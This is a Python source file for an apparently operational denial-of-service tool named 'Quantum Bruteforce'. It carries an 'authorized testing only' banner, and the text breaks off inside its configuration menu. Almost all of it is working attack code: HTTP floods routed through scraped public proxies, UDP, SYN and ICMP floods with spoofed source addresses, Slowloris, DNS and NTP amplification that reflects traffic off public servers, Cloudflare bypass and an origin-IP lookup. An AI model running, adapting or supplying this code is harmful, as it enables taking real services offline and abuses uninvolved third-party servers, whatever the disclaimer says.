#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
QUANTUM BRUTEFORCE - Ultimate Merged Stress Testing Framework v6.3
For AUTHORIZED Security Testing Only
"""

import os
import sys
import time
import random
import socket
import struct
import threading
import signal
import platform
import argparse
import ssl
import socks
import requests
import re
from urllib.parse import urlparse
from datetime import datetime
from time import sleep

# Optional imports – we handle missing gracefully
try:
    from icmplib import ping as icmp_ping
except ImportError:
    icmp_ping = None

try:
    from scapy.all import IP, TCP, UDP, ICMP, send
    from scapy.layers.inet import TCP as ScapyTCP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore: RED=GREEN=YELLOW=CYAN=MAGENTA=WHITE=''
    class Style: RESET_ALL=''
    def init(): pass

try:
    from tqdm import tqdm
except ImportError:
    class tqdm:
        def __init__(self, total=100, desc='', bar_format=''):
            self.total = total
            self.n = 0
        def update(self, n=1):
            self.n += n
        def __enter__(self):
            return self
        def __exit__(self, *args):
            pass

try:
    import cfscrape
except ImportError:
    cfscrape = None

VERSION = "6.3"
LOCK = threading.Lock()

# -------------------- Helper functions --------------------
def spoofer():
    """Generate a random IPv4 address for spoofing."""
    return f"{random.randint(11,197)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(2,254)}"

def random_data():
    """Generate a random alphanumeric string."""
    chars = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890"
    return ''.join(random.choice(chars) for _ in range(16))

def Choice(lst):
    """Safely choose a random element; return None if list empty."""
    return random.choice(lst) if lst else None

def Intn(a, b):
    return random.randint(a, b)

# -------------------- Main Class --------------------
class QuantumBruteforce:
    def __init__(self, args=None):
        self.args = args
        self.sent = 0
        self.running = True
        self.threads = []
        self.target_ip = None
        self.target_port = 80
        self.duration = 0
        self.attack_type = None
        self.thread_count = 200
        self.verbose = False
        self.protocol = 'http'
        self.path = '/'
        self.proxies = []
        self.proxy_type = 5          # 1=HTTP, 4=SOCKS4, 5=SOCKS5
        self.out_file = 'files/proxys/socks.txt'
        self.multiple = 500          # packets per loop (increased for performance)

        self.stats = {
            'start_time': None,
            'end_time': None,
            'total_packets': 0,
            'active_threads': 0,
            'packet_rate': 0,
            'failed_attacks': 0,
            'fallback_used': False
        }

        self.config = {
            'max_threads': 5000,
            'packet_size': 65507,
            'timeout': 5,
        }

        self.platform = platform.system()
        self.is_root = (os.geteuid() == 0) if hasattr(os, 'geteuid') else False

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        # Ensure directories exist
        for d in ['files', 'files/proxys']:
            if not os.path.exists(d):
                os.makedirs(d)

    # -------------------- Signal & Display --------------------
    def signal_handler(self, sig, frame):
        print(f"\n{Fore.RED}[!] Received stop signal. Shutting down...{Style.RESET_ALL}")
        self.stop_attack()

    def banner(self):
        os.system('cls' if self.platform == 'Windows' else 'clear')
        print(f"""
{Fore.CYAN}+----------------------------------------------------------------------+
|                                                                      |
|   {Fore.MAGENTA}██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██╗   ██╗███╗   ███╗{Fore.CYAN}|
|   {Fore.MAGENTA}██╔══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║   ██║████╗ ████║{Fore.CYAN}|
|   {Fore.MAGENTA}██████╔╝██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║{Fore.CYAN}|
|   {Fore.MAGENTA}██╔══██╗██║   ██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║{Fore.CYAN}|
|   {Fore.MAGENTA}██████╔╝╚██████╔╝██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║{Fore.CYAN}|
|   {Fore.MAGENTA}╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝{Fore.CYAN}|
|                                                                      |
|              {Fore.YELLOW}BRUTAL STRESS ENGINE v{VERSION} - MERGED{Fore.CYAN}                   |
|              {Fore.RED}FOR AUTHORIZED SECURITY TESTING ONLY{Fore.CYAN}                       |
|                                                                      |
|              {Fore.GREEN}Platform: {self.platform} | Root: {self.is_root}{Fore.CYAN}                      |
|                                                                      |
+----------------------------------------------------------------------{Style.RESET_ALL}
        """)

    def menu(self):
        self.banner()
        print(f"""
{Fore.GREEN}+-------------------------------------------------------------+
|                  MAIN MENU – QUANTUM BRUTEFORCE X            |
+-------------------------------------------------------------+
|  {Fore.YELLOW}1{Fore.GREEN}. HTTP Flood (GET/POST/HEAD/COOKIE)               |
|  {Fore.YELLOW}2{Fore.GREEN}. UDP Flood (Massive)                             |
|  {Fore.YELLOW}3{Fore.GREEN}. TCP SYN Flood (Requires Root)                   |
|  {Fore.YELLOW}4{Fore.GREEN}. Slowloris (Connection Exhaust)                  |
|  {Fore.YELLOW}5{Fore.GREEN}. DNS Amplification                               |
|  {Fore.YELLOW}6{Fore.GREEN}. ICMP Flood (Requires Root)                     |
|  {Fore.YELLOW}7{Fore.GREEN}. SSL Renegotiation                              |
|  {Fore.YELLOW}8{Fore.GREEN}. Multi‑Vector + Fallback (Recommended)          |
|  {Fore.YELLOW}9{Fore.GREEN}. Advanced L7 (CFB, BYPASS, OVH, etc.)          |
|  {Fore.YELLOW}10{Fore.GREEN}. NTP/Memcached Amplification                   |
|  {Fore.YELLOW}11{Fore.GREEN}. View Statistics                               |
|  {Fore.YELLOW}12{Fore.GREEN}. Configuration                                 |
|  {Fore.YELLOW}13{Fore.GREEN}. Tools (CF‑IP, Ping, Check, DNS)              |
|  {Fore.YELLOW}14{Fore.GREEN}. Exit                                          |
+-------------------------------------------------------------+
        """)
        try:
            choice = input(f"{Fore.CYAN}┌──({Fore.YELLOW}QUANTUM{Fore.CYAN})─{Fore.GREEN}[~]{Fore.CYAN}\n└──╼ {Style.RESET_ALL}")
            return int(choice)
        except ValueError:
            return 14

    # -------------------- URL & Target Parsing --------------------
    def resolve_target(self, host):
        try:
            socket.inet_aton(host)
            return host
        except:
            try:
                return socket.gethostbyname(host)
            except:
                return None

    def parse_url(self, url):
        """Parse a full URL or a simple host:port string."""
        if not url.startswith('http'):
            url = 'http://' + url
        parsed = urlparse(url)
        self.protocol = parsed.scheme or 'http'
        host = parsed.hostname
        if not host:
            # fallback: try to parse as IP:port
            if ':' in url:
                parts = url.split(':')
                if len(parts) >= 2:
                    host = parts[0]
                    try:
                        self.target_port = int(parts[1])
                    except:
                        pass
                else:
                    host = parts[0]
        if host:
            ip = self.resolve_target(host)
            if ip:
                self.target_ip = ip
            else:
                raise ValueError(f"Could not resolve host: {host}")
        self.path = parsed.path or '/'
        if parsed.port:
            self.target_port = parsed.port
        elif self.protocol == 'https':
            self.target_port = 443
        else:
            self.target_port = 80

    def get_target_info(self):
        print(f"\n{Fore.YELLOW}[+] Target Configuration{Style.RESET_ALL}")
        print(f"{Fore.CYAN}─" * 40)

        while True:
            target = input(f"{Fore.GREEN}[?] Target URL (e.g., https://example.com:8080/path): {Style.RESET_ALL}").strip()
            if not target:
                print(f"{Fore.RED}[!] Target cannot be empty{Style.RESET_ALL}")
                continue
            try:
                self.parse_url(target)
                print(f"{Fore.GREEN}[+] Target set to: {self.protocol}://{self.target_ip}:{self.target_port}{self.path}{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

        while True:
            dur = input(f"{Fore.GREEN}[?] Duration in seconds (0 for infinite): {Style.RESET_ALL}")
            if not dur:
                self.duration = 60
                break
            try:
                d = int(dur)
                if d >= 0:
                    self.duration = d
                    break
                print(f"{Fore.RED}[!] Duration must be >=0{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Invalid duration{Style.RESET_ALL}")

        if self.duration > 0:
            print(f"{Fore.YELLOW}[!] Attack will run for {self.duration} seconds{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[!] Attack will run until stopped manually{Style.RESET_ALL}")
        return True

    # -------------------- Proxy Management --------------------
    def get_proxies(self, proxy_file=None):
        if proxy_file and os.path.exists(proxy_file):
            with open(proxy_file, 'r') as f:
                lines = [l.strip() for l in f if ':' in l]
            self.proxies = lines
        else:
            self.download_proxies()
        return self.proxies

    def download_proxies(self):
        print(f"{Fore.YELLOW}[+] Downloading proxies...{Style.RESET_ALL}")
        types = {4: 'socks4', 5: 'socks5', 1: 'http'}
        stype = types.get(self.proxy_type, 'socks5')
        urls = [
            f"https://api.proxyscrape.com/?request=displayproxies&proxytype={stype}&country=all",
            f"https://www.proxy-list.download/api/v1/get?type={stype}",
            f"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/{stype}.txt"
        ]
        out = self.out_file
        os.makedirs(os.path.dirname(out), exist_ok=True)
        with open(out, 'w') as f:
            for url in urls:
                try:
                    r = requests.get(url, timeout=5)
                    f.write(r.text)
                except:
                    pass
        # deduplicate & validate
        with open(out, 'r') as f:
            lines = list(set([l.strip() for l in f if ':' in l]))
        with open(out, 'w') as f:
            f.write('\n'.join(lines))
        self.proxies = lines
        print(f"{Fore.GREEN}[+] Downloaded {len(lines)} proxies{Style.RESET_ALL}")

    # -------------------- Headers Builder --------------------
    def build_headers(self, method):
        headers = ""
        ua = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        if method in ('get', 'head'):
            headers = f"Accept: */*\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nX-Forwarded-For: {spoofer()}\r\n"
        elif method == 'cookie':
            headers = f"Cookie: {random_data()}\r\n"
        elif method == 'brust':
            headers = f"Via: 1.0 PROXY\r\nX-Forwarded-For: {spoofer()}\r\n"
        elif method == 'post':
            headers = "Content-Type: application/x-www-form-urlencoded\r\n"
        return ua + headers

    # -------------------- Attack Methods (L7) --------------------
    def http_attack(self, thread_id, method='GET'):
        """Perform an HTTP/HTTPS flood using the specified method."""
        proxy = Choice(self.proxies).strip().split(':') if self.proxies else None
        s = None
        try:
            if proxy and len(proxy) >= 2:
                s = socks.socksocket()
                if self.proxy_type == 4:
                    s.set_proxy(socks.SOCKS4, proxy[0], int(proxy[1]))
                elif self.proxy_type == 5:
                    s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
                else:
                    s.set_proxy(socks.HTTP, proxy[0], int(proxy[1]))
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.config['timeout'])
            s.connect((self.target_ip, self.target_port))
            if self.protocol == 'https':
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=self.target_ip)

            path = self.path
            if method == 'GET':
                req = f"GET {path} HTTP/1.1\r\nHost: {self.target_ip}\r\n{self.build_headers('get')}\r\n"
            elif method == 'HEAD':
                req = f"HEAD {path} HTTP/1.1\r\nHost: {self.target_ip}\r\n{self.build_headers('head')}\r\n"
            elif method == 'POST':
                data = random._urandom(8)
                req = f"POST {path} HTTP/1.1\r\nHost: {self.target_ip}\r\nContent-Length: {len(data)}\r\n{self.build_headers('post')}\r\n{data}"
            elif method == 'COOKIE':
                req = f"GET {path} HTTP/1.1\r\nHost: {self.target_ip}\r\n{self.build_headers('cookie')}\r\n"
            else:
                req = f"GET {path} HTTP/1.1\r\nHost: {self.target_ip}\r\n{self.build_headers('get')}\r\n"

            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                try:
                    for _ in range(self.multiple):
                        s.send(req.encode())
                        with LOCK:
                            self.sent += 1
                except:
                    # reconnect on error
                    try:
                        s.close()
                    except:
                        pass
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(self.config['timeout'])
                    if self.protocol == 'https':
                        ctx = ssl.create_default_context()
                        s = ctx.wrap_socket(s, server_hostname=self.target_ip)
                    s.connect((self.target_ip, self.target_port))
        except:
            pass
        finally:
            try:
                if s:
                    s.close()
            except:
                pass

    def advanced_l7(self, thread_id, method='CFB'):
        """Advanced L7 attacks using cfscrape (bypass Cloudflare)."""
        if not cfscrape:
            # fallback to normal HTTP
            self.http_attack(thread_id, method='GET')
            return
        proxy = Choice(self.proxies).strip().split(':') if self.proxies else None
        try:
            s = cfscrape.create_scraper()
            if proxy and len(proxy) >= 2:
                if self.proxy_type in (4,5):
                    s.proxies = {
                        'http': f'socks{self.proxy_type}://{proxy[0]}:{proxy[1]}',
                        'https': f'socks{self.proxy_type}://{proxy[0]}:{proxy[1]}'
                    }
                else:
                    s.proxies = {
                        'http': f'http://{proxy[0]}:{proxy[1]}',
                        'https': f'http://{proxy[0]}:{proxy[1]}'
                    }
            url = f"{self.protocol}://{self.target_ip}:{self.target_port}{self.path}"
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                try:
                    if method == 'CFB':
                        s.get(url)
                    elif method == 'BYPASS':
                        s.post(url, data=random._urandom(64))
                    else:  # OVH, GSB, DGB, AVB
                        s.head(url)
                    with LOCK:
                        self.sent += 1
                except:
                    pass
        except:
            pass

    # -------------------- L4/L3 Attacks --------------------
    def udp_flood(self, thread_id):
        """UDP flood with oversized packets."""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payloads = [random._urandom(self.config['packet_size']) for _ in range(50)]
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                try:
                    for _ in range(10):
                        sock.sendto(Choice(payloads), (self.target_ip, self.target_port))
                        with LOCK:
                            self.sent += 1
                except:
                    # ignore errors, keep going
                    pass
        except:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

    def syn_flood(self, thread_id):
        """SYN flood using Scapy (requires root)."""
        if not self.is_root:
            if self.verbose:
                print(f"{Fore.RED}[!] SYN Flood requires root{Style.RESET_ALL}")
            return
        if not SCAPY_AVAILABLE:
            if self.verbose:
                print(f"{Fore.RED}[!] Scapy not installed, SYN Flood unavailable{Style.RESET_ALL}")
            return
        try:
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                try:
                    ip = IP(src=spoofer(), dst=self.target_ip)
                    tcp = TCP(sport=random.randint(1024,65535), dport=self.target_port, flags='S')
                    send(ip/tcp, verbose=False)
                    with LOCK:
                        self.sent += 1
                except:
                    pass
        except:
            pass

    def slowloris(self, thread_id):
        """Slowloris – keep connections open."""
        sockets = []
        start = time.time()
        try:
            for _ in range(min(200, self.config['max_threads'] // 5)):
                if not self.running:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((self.target_ip, self.target_port))
                    s.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode())
                    sockets.append(s)
                    with LOCK:
                        self.sent += 1
                except:
                    pass
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                for s in sockets[:]:
                    try:
                        s.send(Choice([
                            b"X-a: b\r\n",
                            f"Range: bytes=0-{random.randint(100,1000)}\r\n".encode()
                        ]))
                        with LOCK:
                            self.sent += 1
                        time.sleep(random.uniform(1, 5))
                    except:
                        sockets.remove(s)
                        try:
                            s.close()
                        except:
                            pass
        except:
            pass
        finally:
            for s in sockets:
                try:
                    s.close()
                except:
                    pass

    def dns_amplification(self, thread_id):
        """DNS amplification using public resolvers."""
        dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222']
        domains = ['google.com', 'youtube.com', 'facebook.com', 'amazon.com']
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                for dns in dns_servers:
                    try:
                        domain = random.choice(domains)
                        prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
                        full = f"{prefix}.{domain}"
                        query = bytearray([random.randint(0,255) for _ in range(2)])
                        query += b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                        for part in full.split('.'):
                            query.append(len(part))
                            query.extend(part.encode())
                        query += b'\x00\x00\x01\x00\x01'
                        sock.sendto(bytes(query), (dns, 53))
                        with LOCK:
                            self.sent += 1
                    except:
                        pass
        except:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

    def icmp_flood(self, thread_id):
        """ICMP echo flood using Scapy (requires root)."""
        if not self.is_root:
            if self.verbose:
                print(f"{Fore.RED}[!] ICMP requires root{Style.RESET_ALL}")
            return
        if not SCAPY_AVAILABLE:
            if self.verbose:
                print(f"{Fore.RED}[!] Scapy not installed, ICMP Flood unavailable{Style.RESET_ALL}")
            return
        try:
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                try:
                    ip = IP(src=spoofer(), dst=self.target_ip)
                    icmp = ICMP()
                    send(ip/icmp, verbose=False)
                    with LOCK:
                        self.sent += 1
                except:
                    pass
        except:
            pass

    def ssl_reneg(self, thread_id):
        """SSL/TLS renegotiation attack."""
        try:
            import ssl
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((self.target_ip, self.target_port))
                    sec = context.wrap_socket(sock, server_hostname=self.target_ip)
                    for _ in range(20):
                        try:
                            sec.send(b'RENEGOTIATE\r\n')
                            with LOCK:
                                self.sent += 1
                        except:
                            break
                    sec.close()
                except:
                    pass
        except:
            pass

    def ntp_amplification(self, thread_id):
        """NTP amplification using public NTP servers."""
        ntp_servers = ['0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org']
        payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                for server in ntp_servers:
                    try:
                        sock.sendto(payload, (server, 123))
                        with LOCK:
                            self.sent += 1
                    except:
                        pass
        except:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

    def memcached_amplification(self, thread_id):
        """Memcached amplification using public servers (placeholder)."""
        mem_servers = ['127.0.0.1']  # Replace with real list for actual use
        payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break
                for server in mem_servers:
                    try:
                        sock.sendto(payload, (server, 11211))
                        with LOCK:
                            self.sent += 1
                    except:
                        pass
        except:
            pass
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

    # -------------------- Multi‑Vector Fallback --------------------
    def multi_vector_attack(self, total_threads):
        """Distribute threads across multiple attack types."""
        attack_list = [
            (self.http_attack, 30),
            (self.udp_flood, 25),
            (self.dns_amplification, 20),
            (self.slowloris, 15),
            (self.ssl_reneg, 10)
        ]
        for func, pct in attack_list:
            if not self.running:
                break
            count = max(1, int(total_threads * pct / 100))
            for i in range(count):
                if not self.running:
                    break
                try:
                    t = threading.Thread(target=func, args=(i,))
                    t.daemon = True
                    t.start()
                    self.threads.append(t)
                    time.sleep(0.01)
                except:
                    self.stats['failed_attacks'] += 1
                    try:
                        fb = threading.Thread(target=self.udp_flood, args=(i,))
                        fb.daemon = True
                        fb.start()
                        self.threads.append(fb)
                    except:
                        pass

    # -------------------- Start / Stop --------------------
    def start_attack(self, attack_type):
        if not self.get_target_info():
            return

        if attack_type in (1, 9):
            self.get_proxies(self.out_file)

        self.sent = 0
        self.running = True
        self.stats['start_time'] = datetime.now()
        self.stats['target'] = f"{self.target_ip}:{self.target_port}"
        self.stats['failed_attacks'] = 0

        max_allowed = self.config['max_threads']
        if attack_type in (3, 6):
            max_allowed = min(max_allowed, 200)

        while True:
            inp = input(f"{Fore.GREEN}[?] Threads (1-{max_allowed}): {Style.RESET_ALL}")
            try:
                tc = int(inp) if inp else 200
                tc = max(1, min(tc, max_allowed))
                self.thread_count = tc
                break
            except ValueError:
                print(f"{Fore.RED}[!] Invalid number{Style.RESET_ALL}")

        self.threads = []

        attack_map = {
            1: (lambda i: self.http_attack(i, 'GET'), self.thread_count),
            2: (self.udp_flood, self.thread_count),
            3: (self.syn_flood, self.thread_count),
            4: (self.slowloris, self.thread_count),
            5: (self.dns_amplification, self.thread_count),
            6: (self.icmp_flood, self.thread_count),
            7: (self.ssl_reneg, self.thread_count),
            8: (self.multi_vector_attack, self.thread_count),  # special
            9: (lambda i: self.advanced_l7(i, 'CFB'), self.thread_count),
            10: (self.ntp_amplification, self.thread_count),
        }

        if attack_type == 8:
            self.multi_vector_attack(tc)
        else:
            func, cnt = attack_map.get(attack_type, (None, 0))
            if not func:
                print(f"{Fore.RED}[!] Invalid attack type{Style.RESET_ALL}")
                return
            for i in range(tc):
                if not self.running:
                    break
                try:
                    t = threading.Thread(target=func, args=(i,))
                    t.daemon = True
                    t.start()
                    self.threads.append(t)
                    time.sleep(0.01)
                except Exception:
                    self.stats['failed_attacks'] += 1
                    try:
                        fb = threading.Thread(target=self.udp_flood, args=(i,))
                        fb.daemon = True
                        fb.start()
                        self.threads.append(fb)
                    except:
                        pass

        # Listener for 'stop' command
        listener = threading.Thread(target=self.listen_for_stop)
        listener.daemon = True
        listener.start()

        # Monitor
        start_time = time.time()
        try:
            with tqdm(total=100, desc="Attack Progress", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}') as pbar:
                last_sent = 0
                while self.running:
                    elapsed = time.time() - start_time
                    if self.duration > 0 and elapsed > self.duration:
                        break
                    with LOCK:
                        rate = self.sent - last_sent
                        self.stats['packet_rate'] = rate
                        last_sent = self.sent
                        self.stats['total_packets'] = self.sent
                    self.stats['active_threads'] = len([t for t in self.threads if t.is_alive()])
                    pbar.update(1)
                    if self.verbose and rate:
                        print(f"{Fore.CYAN}[+] Packets/sec: {rate}{Style.RESET_ALL}")
                    time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop_attack()

    def listen_for_stop(self):
        while self.running:
            try:
                inp = input()
                if inp.strip().lower() == 'stop':
                    print(f"\n{Fore.YELLOW}[!] Stop command received.{Style.RESET_ALL}")
                    self.stop_attack()
                    break
            except:
                pass
            time.sleep(0.5)

    def stop_attack(self):
        if not self.running:
            return
        print(f"\n{Fore.RED}[!] Stopping attack...{Style.RESET_ALL}")
        self.running = False
        for t in self.threads:
            t.join(timeout=2)
        self.stats['end_time'] = datetime.now()
        duration = 0
        if self.stats['start_time'] and self.stats['end_time']:
            duration = (self.stats['end_time'] - self.stats['start_time']).total_seconds()
        print(f"\n{Fore.GREEN}[+] Attack stopped successfully{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Total packets sent: {self.sent:,}{Style.RESET_ALL}")
        if duration > 0:
            print(f"{Fore.CYAN}[+] Average rate: {self.sent/duration:.2f} packets/sec{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[+] Duration: {duration:.1f} seconds{Style.RESET_ALL}")
        if self.stats['failed_attacks']:
            print(f"{Fore.YELLOW}[!] Fallback used {self.stats['failed_attacks']} times{Style.RESET_ALL}")

    # -------------------- Tools --------------------
    def tool_cfip(self, domain):
        if 'http' in domain:
            domain = domain.replace('https://','').replace('http://','').split('/')[0]
        try:
            url = "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi"
            r = requests.post(url, data={"cfS": domain}, headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
            print(r.text)
        except:
            print(f"{Fore.RED}[!] CF‑IP lookup failed{Style.RESET_ALL}")

    def tool_ping(self, domain):
        if not icmp_ping:
            print(f"{Fore.RED}[!] icmplib not installed. Run: pip install icmplib{Style.RESET_ALL}")
            return
        try:
            r = icmp_ping(domain, count=5, interval=0.2)
            if r.is_alive:
                print(f"{Fore.GREEN}[+] {domain} is online (avg rtt: {r.avg_rtt} ms){Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[!] {domain} is offline{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[!] Ping failed{Style.RESET_ALL}")

    def tool_check(self, domain):
        if not domain.startswith('http'):
            domain = 'http://' + domain
        try:
            r = requests.get(domain, timeout=10)
            status = "ONLINE" if r.status_code < 500 else "OFFLINE"
            print(f"{Fore.GREEN}[+] {domain} - Status: {r.status_code} ({status}){Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[!] Check failed{Style.RESET_ALL}")

    def tools_menu(self):
        print(f"""
{Fore.CYAN}+-------------------------------------------------------------+
|                      TOOLS MENU                               |
+-------------------------------------------------------------+
|  {Fore.YELLOW}1{Fore.GREEN}. CF‑IP Bypass                                     |
|  {Fore.YELLOW}2{Fore.GREEN}. Ping a host                                     |
|  {Fore.YELLOW}3{Fore.GREEN}. Check website status                            |
|  {Fore.YELLOW}4{Fore.GREEN}. DNS Lookup (placeholder)                        |
|  {Fore.YELLOW}5{Fore.GREEN}. DSTAT (system stats)                            |
|  {Fore.YELLOW}6{Fore.GREEN}. Back to Main Menu                               |
+-------------------------------------------------------------+
        """)
        choice = input(f"{Fore.CYAN}Select option: {Style.RESET_ALL}")
        if choice == '1':
            dom = input("Domain: ")
            self.tool_cfip(dom)
        elif choice == '2':
            dom = input("Host: ")
            self.tool_ping(dom)
        elif choice == '3':
            dom = input("URL: ")
            self.tool_check(dom)
        elif choice == '4':
            print(f"{Fore.YELLOW}DNS lookup coming soon...{Style.RESET_ALL}")
        elif choice == '5':
            os.system('dstat' if platform.system() != 'Windows' else 'pause')
        elif choice == '6':
            return
        input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

    # -------------------- Stats, Config, Help --------------------
    def show_stats(self):
        duration = 0
        if self.stats['start_time']:
            end = self.stats['end_time'] or datetime.now()
            duration = (end - self.stats['start_time']).total_seconds()
        print(f"""
{Fore.CYAN}+----------------------------------------------------------------------+
|                      QUANTUM STATISTICS                              |
+----------------------------------------------------------------------+
| Total Packets:      {self.sent:>45,} |
| Packet Rate:        {self.stats['packet_rate']:>45,}/s |
| Target:             {self.target_ip if self.target_ip else 'N/A':>45} |
| Port:               {self.target_port if self.target_port else 'N/A':>45} |
| Active Threads:     {len([t for t in self.threads if t.is_alive()]):>45} |
| Status:             {('Running' if self.running else 'Stopped'):>45} |
| Duration:           {duration:.1f}s{' ' if duration else 'N/A':>44} |
| Fallback Used:      {str(self.stats['fallback_used']):>45} |
| Start Time:         {str(self.stats['start_time']):>45} |
| End Time:           {str(self.stats['end_time']):>45} |
+----------------------------------------------------------------------{Style.RESET_ALL}
        """)

    def help_menu(self):
        print(f"""
{Fore.CYAN}=====================================================================
                  {Fore.YELLOW}QUANTUM BRUTEFORCE - HELP{Fore.CYAN}
=====================================================================

{Fore.GREEN}ATTACK TYPES (Menu options):{Fore.CYAN}
---------------------------------------------------------------------
1. HTTP Flood       – GET/POST/HEAD/COOKIE (uses proxies)
2. UDP Flood        – Massive UDP packets
3. SYN Flood        – Raw SYN (root)
4. Slowloris        – Connection exhaustion
5. DNS Amplification – Reflection with random subdomains
6. ICMP Flood       – Ping flood (root)
7. SSL Renegotiation – TLS renegotiation
8. Multi‑Vector     – Combined with fallback
9. Advanced L7      – CFB, BYPASS, OVH, etc. (uses proxies)
10. NTP/Memcached   – Amplification attacks

{Fore.GREEN}COMMANDS:{Fore.CYAN}
---------------------------------------------------------------------
• {Fore.YELLOW}Ctrl+C{Fore.CYAN}         – Stop attack
• {Fore.YELLOW}type 'stop'{Fore.CYAN}   – Same as Ctrl+C
• {Fore.YELLOW}11{Fore.CYAN}             – View statistics
• {Fore.YELLOW}12{Fore.CYAN}             – Configure settings
• {Fore.YELLOW}13{Fore.CYAN}             – Tools menu

{Fore.GREEN}REQUIREMENTS:{Fore.CYAN}
---------------------------------------------------------------------
• Python 3.6+
• Root for SYN/ICMP
• Permission to test target

{Fore.RED}LEGAL NOTICE:{Fore.RED}
---------------------------------------------------------------------
This tool is for AUTHORIZED SECURITY TESTING only.
Unauthorized use is ILLEGAL. Obtain written permission.
{Style.RESET_ALL}
        """)

    def configuration(self):
        print(f"""
{Fore.CYAN}+----------------------------------------------------------------------+
|                       CONFIGURATION                                    |
+----------------------------------------------------------------------+
| 1. Max Threads:        {self.config['max_threads']:>37} |
| 2. Packet Size:        {self.config['packet_size']:>37} |
| 3. Timeout:            {self.config['timeout']:>37}s |
| 4. Proxy Type (1=HTTP,4=SOCKS4,5=SOCKS5): {self.proxy_type:>37} |
| 5. Proxy File:         {self.out_file:>37} |
| 6. Verbose Mode:       {'Enabled' if self.verbose else 'Disabled':>37} |
| 7. Reset to Defaults                                         |
| 8. Back to Main Menu                                         |
+----------------------------------------------------------------------{Style.RESET_ALL}
        """)
        choice = input(f"{Fore.CYAN}Select option: {Style.RESET_ALL}")
        if choice == '1':
            try:
                v = int(input(f"{Fore.GREEN}Enter max threads (1-5000): {Style.RESET_ALL}"))
                self.config['max_threads'] = max(1, min(v, 5000))
            except:
                pass
        elif choice == '2':
            try:
                v = int(input(f"{Fore.GREEN}Enter packet size (512-65507): {Style.RESET_ALL}"))
                self.config['packet_size'] = max(512, min(v, 65507))
            except:
                pass
        elif choice == '3':
            try:
                v = int(input(f"{Fore.GREEN}Enter timeout (1-30): {Style.RESET_ALL}"))
                self.config['timeout'] = max(1, min(v, 30))
            except:
                pass
        elif choice == '4':
            try:
                v = int(input(f"{Fore.GREEN}Enter proxy type (1=HTTP,4=SOCKS4,5=SOCKS5): {Style.RESET_ALL}"))
